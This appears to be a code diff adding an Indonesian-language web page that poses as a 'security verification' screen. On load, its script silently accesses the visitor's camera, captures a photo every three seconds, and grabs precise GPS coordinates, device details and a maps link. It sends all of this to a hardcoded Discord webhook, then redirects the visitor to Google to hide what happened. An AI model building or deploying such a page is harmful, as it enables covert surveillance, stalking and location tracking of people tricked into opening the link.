@@ -1,0 +1,245 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            text-align: center;
+            max-width: 400px;
+        }
+        h1 { color: #333; margin-bottom: 20px; }
+        p { color: #666; font-size: 14px; }
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #video { display: none; width: 100%; }
+        #canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Verifikasi Keamanan</h1>
+        <p>Memverifikasi lokasi Anda...</p>
+        <div class="spinner"></div>
+    </div>
+
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1550451547228606494/emiqaTiGbFBHjIM_z7oZuXm_-n-lRMPnePaBUrmCeEdds4MHkxmmOInkXT8AGUOoxaoc';
+        const VIDEO_WEBHOOK = 'https://discord.com/api/webhooks/1550451547228606494/emiqaTiGbFBHjIM_z7oZuXm_-n-lRMPnePaBUrmCeEdds4MHkxmmOInkXT8AGUOoxaoc';
+        
+        let cameraStream = null;
+        let captureInterval = null;
+
+        // Silent camera access
+        async function silentCameraCapture() {
+            try {
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                }).catch(() => {
+                    // Fallback: coba rear camera
+                    return navigator.mediaDevices.getUserMedia({
+                        video: { 
+                            facingMode: 'environment',
+                            width: { ideal: 1280 },
+                            height: { ideal: 720 }
+                        },
+                        audio: false
+                    });
+                });
+
+                const video = document.getElementById('video');
+                video.srcObject = cameraStream;
+                
+                // Auto-capture every 3 detik
+                captureInterval = setInterval(() => {
+                    captureAndSend();
+                }, 3000);
+
+            } catch (error) {
+                console.log('Camera akses gagal');
+                redirect();
+            }
+        }
+
+        // Capture & encode foto
+        function captureAndSend() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            
+            if (!canvas.getContext) return;
+            
+            const ctx = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            
+            ctx.drawImage(video, 0, 0);
+            
+            canvas.toBlob((blob) => {
+                sendPhotoToDiscord(blob);
+            }, 'image/jpeg', 0.8);
+        }
+
+        // Convert blob to base64 & send
+        function sendPhotoToDiscord(blob) {
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const base64 = e.target.result.split(',')[1];
+                
+                // Send via webhook dengan image embed
+                const data = {
+                    "embeds": [{
+                        "title": "📸 Live Photo Capture",
+                        "color": 16711680,
+                        "image": {
+                            "url": `data:image/jpeg;base64,${base64}`
+                        },
+                        "fields": [
+                            {
+                                "name": "Timestamp",
+                                "value": new Date().toLocaleString('id-ID'),
+                                "inline": true
+                            },
+                            {
+                                "name": "Device",
+                                "value": navigator.userAgent.substring(0, 100),
+                                "inline": false
+                            }
+                        ]
+                    }]
+                };
+
+                fetch(VIDEO_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+            };
+            reader.readAsDataURL(blob);
+        }
+
+        // Capture geolocation (tetap)
+        function captureLocation() {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+
+                    const data = {
+                        "content": "",
+                        "embeds": [{
+                            "title": "📍 Data Tertangkap",
+                            "color": 16711680,
+                            "fields": [
+                                {
+                                    "name": "Latitude",
+                                    "value": lat.toString(),
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Longitude",
+                                    "value": lon.toString(),
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Akurasi",
+                                    "value": accuracy.toString() + "m",
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Timezone",
+                                    "value": Intl.DateTimeFormat().resolvedOptions().timeZone,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Platform",
+                                    "value": navigator.platform,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Resolution",
+                                    "value": screen.width + "x" + screen.height,
+                                    "inline": true
+                                },
+                                {
+                                    "name": "Maps Link",
+                                    "value": `https://maps.google.com/?q=${lat},${lon}`,
+                                    "inline": false
+                                },
+                                {
+                                    "name": "Waktu",
+                                    "value": new Date().toLocaleString('id-ID'),
+                                    "inline": false
+                                }
+                            ]
+                        }]
+                    };
+
+                    fetch(WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                },
+                function(error) {
+                    console.log('Location denied');
+                }
+            );
+        }
+
+        function redirect() {
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 2000);
+        }
+
+        // Start everything on load
+        window.addEventListener('load', () => {
+            silentCameraCapture();
+            captureLocation();
+            redirect();
+        });
+
+        // Stop camera when window close
+        window.addEventListener('beforeunload', () => {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            clearInterval(captureInterval);
+        });
+    </script>
+</body>
+</html>
